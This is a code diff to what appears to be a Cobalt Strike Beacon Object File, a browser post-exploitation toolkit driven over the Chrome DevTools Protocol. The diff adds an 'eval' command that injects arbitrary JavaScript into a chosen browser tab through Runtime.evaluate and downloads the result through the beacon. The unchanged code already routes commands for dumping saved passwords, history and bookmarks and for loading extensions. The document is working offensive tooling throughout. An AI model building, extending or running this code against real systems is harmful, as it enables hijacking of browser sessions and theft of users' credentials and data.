@@ -14,6 +14,7 @@
 #define CDPTK_MAX_HTTP (16u * 1024u * 1024u)
 #define CDPTK_MAX_WS   (64u * 1024u * 1024u)
 #define CDPTK_CHUNK    16384u
+#define CDPTK_MAX_EVAL 65535u
 
 #ifdef BOF
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
@@ -804,6 +805,52 @@ static int operation_servicenow_gck(INTERNET_PORT port, const char* selector) {
   return ok;
 }
 
+static int operation_eval(INTERNET_PORT port, const char* selector, const char* expression) {
+  TARGET target;
+  bytes_zero(&target, sizeof(target));
+  if (!selector || !*selector) {
+    out_error("eval requires an exact target ID");
+    return 0;
+  }
+  if (!expression || !*expression) {
+    out_error("eval requires a JavaScript expression");
+    return 0;
+  }
+  if (!resolve_target(port, selector, &target) || !target.ws[0]) {
+    out_error("eval target not found");
+    return 0;
+  }
+  if (!s_eq(target.id, selector)) {
+    out_error("eval requires the complete target ID, not an index or partial selector");
+    return 0;
+  }
+
+  CDP page;
+  BUF response = {0};
+  bytes_zero(&page, sizeof(page));
+  if (!cdp_open(&page, port, target.ws)) {
+    out_error("eval target WebSocket connection failed");
+    return 0;
+  }
+
+  int ok = evaluate(&page, expression, &response);
+  if (!ok || !response.data) {
+    out_error("Runtime.evaluate failed");
+    ok = 0;
+  } else {
+    int protocol_error = cdp_error(&response);
+    int js_exception = s_contains_range(response.data, response.data + response.len,
+                                        "\"exceptionDetails\"");
+    int downloaded = out_artifact("cdptk-eval.json", (BYTE*)response.data, response.len);
+    if (!downloaded) ok = 0;
+    else if (js_exception) { out_error("JavaScript exception; details downloaded"); ok = 0; }
+    else if (protocol_error) { out_error("Runtime.evaluate returned a protocol error"); ok = 0; }
+  }
+  buf_free(&response);
+  cdp_close(&page);
+  return ok;
+}
+
 static int operation_webui(INTERNET_PORT port, const char* kind, const char* query) {
   CDP browser, page; BUF version = {0}, create = {0}, params = {0}, response = {0};
   bytes_zero(&browser, sizeof(browser));
@@ -878,6 +925,7 @@ static int dispatch(const char* command, INTERNET_PORT port, const char* arg1, c
   if (s_eq(command, "context-dispose")) return operation_context_dispose(port, arg1);
   if (s_eq(command, "snapshot")) return operation_snapshot(port, arg1, arg2);
   if (s_eq(command, "extensions-load")) return operation_extensions_load(port, arg1, flags & 1);
+  if (s_eq(command, "eval")) return operation_eval(port, arg1, arg2);
   if (s_eq(command, "servicenow-gck")) return operation_servicenow_gck(port, arg1);
   if (s_eq(command, "bookmarks") || s_eq(command, "history") ||
       s_eq(command, "saved-passwords") || s_eq(command, "extensions"))
@@ -896,16 +944,31 @@ static void copy_arg(char* dst, DWORD cap, char* src, int len) {
 
 void go(char* args, int alen) {
   datap parser;
-  int n = 0;
+  int n = 0, arg2_len = 0;
   char command[64] = {0}, arg1[4096] = {0}, arg2[256] = {0};
+  char* eval_expression = 0;
   BeaconDataParse(&parser, args, alen);
   char* p = BeaconDataExtract(&parser, &n); copy_arg(command, sizeof(command), p, n);
   int port = BeaconDataInt(&parser);
   p = BeaconDataExtract(&parser, &n); copy_arg(arg1, sizeof(arg1), p, n);
-  p = BeaconDataExtract(&parser, &n); copy_arg(arg2, sizeof(arg2), p, n);
+  p = BeaconDataExtract(&parser, &arg2_len);
+  if (s_eq(command, "eval")) {
+    if (!p || arg2_len < 2 || p[arg2_len - 1] != 0) {
+      out_error("eval requires a null-terminated JavaScript expression");
+      return;
+    }
+    if ((unsigned int)(arg2_len - 1) > CDPTK_MAX_EVAL) {
+      out_error("eval expression exceeds 65535 bytes");
+      return;
+    }
+    eval_expression = p;
+  } else {
+    copy_arg(arg2, sizeof(arg2), p, arg2_len);
+  }
   int flags = BeaconDataInt(&parser);
   if (!command[0]) { out_error("command required"); return; }
-  dispatch(command, (INTERNET_PORT)port, arg1, arg2, flags);
+  dispatch(command, (INTERNET_PORT)port, arg1,
+           eval_expression ? eval_expression : arg2, flags);
 }
 #else
 int main(int argc, char** argv) {
